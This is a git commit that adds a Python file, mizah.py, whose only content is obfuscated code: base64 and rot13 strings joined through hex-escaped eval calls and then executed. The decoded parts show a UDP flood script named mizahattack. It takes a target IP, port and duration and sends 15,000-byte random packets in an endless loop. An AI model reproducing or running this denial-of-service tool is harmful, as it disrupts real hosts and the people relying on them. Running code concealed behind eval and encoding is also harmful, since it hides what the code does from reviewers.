72ed9ab3e0a16a589789fca5d5c47255c56e412b
mizahx <94347285+mizahx@users.noreply.github.com>
2021-12-20 21:31:06 +0300

    Add files via upload

---
+++ mizah.py
@@ -0,0 +1,13 @@
+""" 
+Python code obfuscated by mizah :)
+ 
+"""
+
+import base64, codecs
+magic = 'IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IHNvY2tldCxyYW5kb20sc3lzLHRpbWUKIAppZiBsZW4oc3lzLmFyZ3YpPT0xOgogICAgc3lzLmV4aXQoJ0t1bGxhbsSxbSA6IHB5dGhvbiBtaXphaC5weSBpcCBwb3J0IGxlbmdodChULkUgPSAzMCknKQogCmRlZiBtaXphaGF0dGFjaygpOgogICAgcG9ydCA9IGludChzeXMuYXJndls'
+love = 'lKFxXVPNtVUWuozEjo3W0CFuHpaIyYRMuoUAyXIgjo3W0CG0jKDbtVPNtnKNtCFOmrKZhLKWaqyfkKDbtVPNtMUIlVQ0tnJ50XUA5pl5upzq2JmAqXDbtVPNtL2kiL2f9XTkuoJWxLGbjYUEcoJHhL2kiL2fcJ2E1pw4jKDbtVPNtMUIlLKEco249XQRfXTAfo2AeXPxeMUIlXFyoMUIlCwOqPvNtVPOjpzyhqPtaH2SfMZFkpfFkVR'
+god = 'R1cnVtdSA6ICAlczolcyBmb3IgJXMgU2FuaXllJyUoaXAscG9ydCxkdXIgb3IgJ2luZmluaXRlJykpCiAgICBzb2NrPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfREdSQU0pCiAgICBieXRlcz1yYW5kb20uX3VyYW5kb20oMTUwMDApCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHBvcnQ9KHJhbmRvb'
+destiny = 'F5lLJ5xnJ50XQRfZGHjZQNjZQNcYUOipaDcJ3WuozEjo3W0KDbtVPNtVPNtVTyzVTAfo2AeXPx8MUIlLKEco246PvNtVPNtVPNtVPNtVUAiL2fhp2IhMUEiXTW5qTImYPucpPkjo3W0XFxXVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPOvpzIunjbtVPNtpUWcoaDbW1AuoTGRfKYRfFOPnKE0nF4aXDcgnKcunTS0qTSwnltcPt=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
